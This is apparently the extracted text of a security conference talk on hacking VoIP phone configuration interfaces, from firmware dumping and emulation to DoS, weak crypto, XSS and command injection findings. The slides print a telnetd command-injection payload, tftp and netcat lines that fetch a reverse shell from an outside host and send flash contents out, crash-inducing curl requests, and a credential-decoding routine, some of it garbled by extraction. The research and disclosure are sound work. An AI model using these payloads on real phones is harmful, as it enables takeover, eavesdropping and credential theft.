I‘m on Your Phone, Listening –
Attacking VoIP Configuration
Interfaces
Stephan Huber | Fraunhofer SIT, Germany 
Philipp Roskosch | Fraunhofer SIT, Germany
About us
Stephan
 Security Researcher @Testlab
Mobile Security (Fraunhofer SIT)
 Code Analysis Tool development 
 IOT Stuff
 Founder of @TeamSIK
2
About us
Philipp
 Security Researcher & Pentester
@Secure Software Engineering 
(Fraunhofer SIT)
 Static Code Analysis
 IoT Vuln Detection Research
 Day 1 Member of @TeamSIK
3
 TODO
4
Alexander Traud
Acknowledgements
Beer Announcement
5
Past Projects
6
Def Con 26: Tracker Apps
DeF Con 25: Password Manager Apps
Def Con 24: Anti Virus Apps
Blackhat EU 2015: BAAS Security
https://team-sik.org
What’s next?
7
 Wide distribution
 Complex software
 Readily accessible
The Target Devices
8
Perfect World
9
Internet
Guest Network
Workstation Network
VoIP Phone Network
Real World
10
Internet
Network
VoIP Phones
Guests
Workstations
Publicly reachable!
Agenda
11
 Background
 IoT Hacking 101
 Findings
 DOS, Weak Crypto, XSS, CSRF
 Command Injection
 Authentication Bypass
 Memory Corruption
 Recommendations 
 Responsible disc. experiences
 Summary
12
Background
Architecture and Attack Targets
ARM/
MIPS
F
L
A
S
H
Linux OS 
Kernel
Bootloader
13
Architecture and Attack Targets
ARM/
MIPS
F
L
A
S
H
Linux OS 
Kernel
init
uid:0
watchdog   uid:0
sipd
uid:0
•
loads kernel modules/drivers
•
spawn webserver
•
launch scripts
•
command interface
•
…
(web)server uid:0
Bootloader
•
basic setup 
•
starts daemons
•
…
•
checks if daemons run
•
…
14
Architecture and Attack Targets
ARM/
MIPS
F
L
A
S
H
Linux OS 
Kernel
init
uid:0
watchdog   uid:0
sipd
uid:0
•
loads kernel modules/drivers
•
spawn webserver
•
launch scripts
•
command interface
•
…
(web)server uid:0
Bootloader
•
basic setup 
•
starts daemons
•
…
•
checks if daemons run
•
…
15
16
Methodology
Abstract Methodology
17
Webserver is 
Running
Web Pentesting
Static Analysis
Dynamic Analysis
Setup VoIP Phone
Attach HTTP Proxy
Extract Firmware
Emulation
Abstract Methodology
18
Inject dynamic analysis tools
Webserver is 
Running
Web Pentesting
Static Analysis
Dynamic Analysis
Setup VoIP Phone
Attach HTTP Proxy
Extract Firmware
Emulation
Toolchain
19
ZAP, Burp Suite
IDA Pro, Ghidra
binwalk, yara
gdb, gdbserver, strace
ropper, IDA rop Plugin
mutiny, boofuzz, …
qemu
Webserver is 
Running
Web Pentesting
Static Analysis
Dynamic Analysis
Setup VoIP Phone
Attach HTTP Proxy
Extract Firmware
Emulation
20
Firmware Access
Firmware Access for Software People
 Out of scope is desoldering of chips and complex hardware setup 
and probes
https://blog.quarkslab.com/flash-dumping-part-i.html
21
https://hackaday.com/wp-content/uploads/2017/01/dash-mitm.png
Firmware Access for Software People 
 Download the firmware from 
vendor/manufacturer
 Get image from update traffic
 Get image or files from the device
22
•
Only updates, diffs or patches available
•
Encrypted images
•
No update server, only manual 
HW for Software People we used
 JTAGulator* by Joe Grand (presented at DC 21)
 Find JTAG and UART interfaces
 UART pass through (flexible voltage)
 Bus Pirate
 UART, SPI, JTAG debugging
 mArt UART adapter**
 Raspberry Pi
 …
* http://www.grandideastudio.com/jtagulator/
** https://uart-adapter.com/
23
Examples: SPI
Bus 
Pirate
Flash Chip
Description
CS #1
CS
Chip Select
MISO #2 
DO (IO1)
Master In, Slave Out
3V3 #3
WP (IO2)
Write Protect
GND #4   
GND
Ground
MOSI  #5
DI (IO0)
Master Out, Slave In
CLK #6
CLK
SPI Clock
3V3 #7
HOLD (IO3)
Hold
3V3 #8
VCC
Supply
Find Datasheet
Winbond W25Q64JV
Chip on Device
Connect Bus Pirate
24
Connected
 Akuvox R50 VoIP Phone with Bus Pirate connected
25
Dump it
 Flashrom* chip detection:
 Flashrom dump:
 File extraction :
 Multiple dumps, output variation:
$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0 
* https://github.com/flashrom/flashrom
$ flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -c W25Q64.V -r firmw2.bin
$ binwalk -eM firmw.bin
Filename
MD5
firmw.bin
3840d51b37fe69e5ac7336fe0a312dd8 
firmw2.bin
403ae93e72b1f16712dd25a7010647d6 
26
Examples: UART
 Fanvil X6 UART connection
27
Examples: Bootloader
 UART bootloader via serial console (minicom, screen, putty, …) :
28
help
info
reboot
run [app addr] [entry addr]
r [addr]
w [addr] [val]
d [addr] 
resetcfg
…
Bootloader Menu:
Dump flash memory:
d 0x81000000 7700000
Examples: UART
 UART root shell:
29
Use Vulnerability
 Command injection starts telnet:
 Root shell without authentication:
30
;busybox telnetd &#
Connected to 10.148.207.126.
Escape character is '^]'.
DSPG v1.2.4-rc2 OBiPhone
OBiPhone login: root
root@OBiPhone:~# id
uid=0(root) gid=0(root) groups=0(root)
Dump with Console
31
 Tftp client part of busybox and/or used for firmware update
 Simple tftpserver* required
 Download - load file onto device:
tftp -g -r revshell 10.148.207.102 6969
 Upload - get file from device: 
tftp -p -r /dev/mtdblock0 10.148.207.102 6969
 Netcat, if part of busybox pipe data to listener:
 Listener, receiver of data:
nc –lp 4444 | tar x
 Sender, data source:
busybox tar cf - /dev/mtdblock0 | busybox nc 10.148.207.227
 Other clients, like wget, webform, scp, etc…
* https://github.com/sirMackk/py3tftp
32
Emulation
Emulation Approaches
 CPU emulation (e.g. Unicorn)
 User mode emulation
 System mode emulation (third party OS)
 System mode emulation with original file system
 System mode emulation including original kernel modules
 Full system emulation (including unknown peripherals and 
interfaces)
33
Emulation Approaches
 CPU emulation (e.g. Unicorn)
 User mode emulation
 System mode emulation (third party OS)
 System mode emulation with original file system
 System mode emulation including original kernel modules
 Full system emulation (including unknown peripherals and 
interfaces)
34
Firmware Emulation
Emulator (QEMU ARM/MIPS)
Kernel
Linux FS
35
Firmware Emulation
UI
API
Process
Firmware FS
Emulator (QEMU ARM/MIPS)
Kernel
chroot environment
Linux FS
36
Firmware Emulation
UI
API
Process
Firmware FS
Emulator (QEMU ARM/MIPS)
Kernel
chroot environment
gdb
strace
Analyzing Tools
Linux FS
dynamic hooks
Value spoofing/runtime patching:
•
Hook function
•
Modify runtime values
•
Memory dumps
•
…
37
Example gdb Patch Script
38
 gdb script:
#enable non stop mode
set target-async on
set non-stop off
#attach
target remote localhost:2345
#change fork mode
set follow-fork-mode parent
show follow-fork-mode
#first continue
c
#first breakpoint at printf b1
br *0x1a1bc
#3rd continue ssl armv7probe
c
…
#change sighandler (11 segfault)
set $r0=8
# continue for break1a
c
…
gdb mode change
“Automatic” continue or break
Change values at runtime
39
Findings !
DoS
40
 Multiple ways of DoSing VoIP phones!
 Limited CPU/ memory resources 
 Parsing problems
 Bad TCP/IP Stack implementation
 Memory corruptions, usage of “bad C” functions
 …
DoS – Super Simple I
41
 Extensive nmap scan is too much for Mitel 6865i
nmap -p 1-65535 -T4 -A my.voip.phone
DoS – Assert Instruction
43
 Cisco IP Phone 7821
curl 'http://10.148.207.42/basic"/init.json' -H …
DoS – Assert Instruction
44
 Cisco IP Phone 7821
curl 'http://10.148.207.42/basic"/init.json' -H …
DoS – Assert Instruction
45
 Cisco IP Phone 7821
curl 'http://10.148.207.42/basic"/init.json' -H …
[..]
voice-http:app_get:"/ init.json
spr_voip: src/http_get_pal.c:374: http_gen_json: Assertion `core_uri[0] == '/'' failed.
[..]
restart_mgr-connection 18 from spr_voip closed
restart_mgr-processing kill-list for spr_voip
restart_mgr-killing ms
[..]
DoS – CVE-2017-3731 – OpenSSL 
46
 Web interface provides login via https://  OpenSSL
 Malformed packet causes out-of-bounds read
 OpenSSL Version 1.0.2 and 1.1.0
 Results in different behavior 
 Fanvil X1P, Firmware 2.10.0.6586, Phone reboots
 Mitel, Firmware 5.1.0.1024, Phone reboots
 ALE, Firmware 1.30.20, Webserver crashes
 Samsung, Firmware 01.62, Webserver restarts
Bad crypto stuff
47
Bad Crypto Stuff !
Bad Crypto
48
 Config File Export in Akuvox R50
 Credentials are encrypted ?
[ LOGIN ]
User =admin
Password =D/6SxcRQwsgPwVwdfIiQhg+zh8fqlvfBkNY29aSkxw+CwqItFbeLaPG7tx0D
[ WEB_LOGIN ] User =admin
Password =xzahQYJBxcgPwVwdfJVoYTfCwiyaoosyF5BAHQ8zleoVwcdBKPXCx0aQxIaJ
Type =admin
User02 =user
Password02 =8cFhHfcPCJIzUP58xJpGNsHHu1C3xAjHt4ReQmFA91DqF0Ayw4c3QEbFhDIo
Bad Crypto
49
 Config File Export in Akuvox R50
 Credentials are encrypted, for real
$ echo -n "xzahQYJBxcgPwVwdfJVoYTfCwiyaoosyF5BAHQ8zleoVwcdBKPXCx0aQxIaJ" 
| base64 -d | xxd
00000000: c736 a141 8241 c5c8 0fc1 5c1d 7c95 6861  .6.A.A....\.|.ha
00000010: 37c2 c22c 9aa2 8b32 1790 401d 0f33 95ea  7..,...2..@..3..
00000020: 15c1 c741 28f5 c2c7 4690 c486 89         ...A(...F....
Bad Crypto
50
 FW Extraction -> Binary investigation
int phone_aes_decrypt(char *key, char *decoded_str, int size, char *result) {
}
Bad Crypto
51
 FW Extraction -> Binary investigation
int phone_aes_decrypt(char *key, char *decoded_str, int size, char *result) {
}
Bad Crypto
52
 FW Extraction -> Binary investigation
int phone_aes_decrypt(char *key, char *decoded_str, int size, char *result) {
int i;
int j;
int k;
unsigned char tmp;
if ( !key || !decoded_str || !result || !size )
return -1;
for (i = 0; i  j; j++) {
printf("j=%d\n",j);
tmp = *decoded_str;
for (k = 0; k  Binary investigation
int phone_aes_decrypt(char *key, char *decoded_str, int size, char *result) {
int i;
int j;
int k;
unsigned char tmp;
if ( !key || !decoded_str || !result || !size )
return -1;
for (i = 0; i  j; j++) {
printf("j=%d\n",j);
tmp = *decoded_str;
for (k = 0; k < size - 1; k++) {
decoded_str[k] = decoded_str[k + 1];
}
decoded_str[size - 1] = tmp;
}
return 0;
}
 Self-implemented
 Simple substitution
 Hardcoded Key in FW
“akuvox“
54
WEB ATTACKS
 AudioCodes 405HD
 My favorite contact name: 
Web Based Findings – XSS 
55
 AudioCodes 405HD
 My favorite contact name: 
Web Based Findings – XSS 
56
Web Based Findings – Gigaset Maxwell Basic
58
 Information leak
Using  the 
Web-Interface
Traffic Analysis
Web Based Findings – Gigaset Maxwell Basic
59
GET http://gigaset.voip/Parameters
Using  the 
Web-Interface
Traffic Analysis